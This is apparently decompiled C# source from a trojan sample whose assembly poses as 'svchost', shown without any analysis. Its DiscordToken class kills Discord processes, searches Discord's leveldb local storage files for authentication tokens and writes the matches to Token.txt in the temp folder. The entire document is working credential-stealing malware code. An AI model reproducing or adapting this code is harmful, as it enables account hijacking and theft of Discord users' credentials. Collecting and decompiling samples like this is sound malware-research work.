// Decompiled with JetBrains decompiler
// Type: svchost.Other.DiscordToken
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;

namespace svchost.Other
{
  [OptionText]
  public class DiscordToken
  {
    public object GetToken()
    {
      if (!Conversions.ToBoolean(this.KillDiscord()))
        return (object) true;
      List<string> stringList = this.SearchForFile();
      if (stringList.Count == 0)
        return (object) false;
      try
      {
        foreach (string input in stringList)
        {
          try
          {
            foreach (Match match in Regex.Matches(input, "[^\"]*"))
            {
              if (match.Length == 59)
              {
                using (StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "Token.txt"), true))
                  streamWriter.WriteLine("Discord Token = " + match.ToString());
              }
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return (object) true;
    }

    private List<string> SearchForFile()
    {
      List<string> stringList = new List<string>();
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
      if (!Directory.Exists(str1))
        return stringList;
      string[] files = this.getFiles(str1, "*.log|*.ldb", SearchOption.TopDirectoryOnly);
      int index = 0;
      while (index < files.Length)
      {
        string str2 = File.ReadAllText(files[index]);
        if (str2.Contains("oken"))
          stringList.Add(str2);
        checked { ++index; }
      }
      return stringList;
    }

    private object KillDiscord()
    {
      object obj;
      try
      {
        if (Process.GetProcessesByName("Discord").Length > 0)
        {
          Process[] processesByName = Process.GetProcessesByName("Discord");
          int index = 0;
          while (index < processesByName.Length)
          {
            processesByName[index].Kill();
            checked { ++index; }
          }
          obj = (object) true;
        }
        else
          obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public string[] getFiles(string SourceFolder, string Filter, SearchOption searchOption)
    {
      ArrayList arrayList = new ArrayList();
      string[] strArray = Filter.Split('|');
      int index = 0;
      while (index < strArray.Length)
      {
        string searchPattern = strArray[index];
        arrayList.AddRange((ICollection) Directory.GetFiles(SourceFolder, searchPattern, searchOption));
        checked { ++index; }
      }
      return (string[]) arrayList.ToArray(Type.GetType("System.String"));
    }
  }
}
